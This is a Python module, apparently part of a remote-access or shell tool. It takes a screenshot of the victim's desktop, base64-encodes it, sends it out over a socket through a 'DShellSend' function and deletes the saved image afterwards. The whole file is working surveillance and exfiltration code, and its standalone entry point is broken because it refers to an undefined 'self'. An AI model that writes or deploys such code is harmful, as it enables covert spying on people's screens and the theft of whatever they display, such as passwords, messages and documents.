#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/3/12 16:25

import base64
from os import remove
from PIL import ImageGrab
from lib.dsSocket import *

class Screen():
    def __init__(self, client):
        self.client = client
        self.screen()

    # 截屏
    def screen(self):
        img = ImageGrab.grab()
        img.save("screen.png")
        base64Data = self.image2base64("screen.png")
        # self.base642image(base64Data, "screenResult.png")
        DShellSend(self.client, base64Data)
        remove("screen.png")

    #image转base64
    def image2base64(self, image):
        with open(image, "rb") as f: # 二进制格式读取
            base64Data = base64.b64encode(f.read())
            return base64Data

if __name__ == "__main__":
    Screen(self.client)
    pass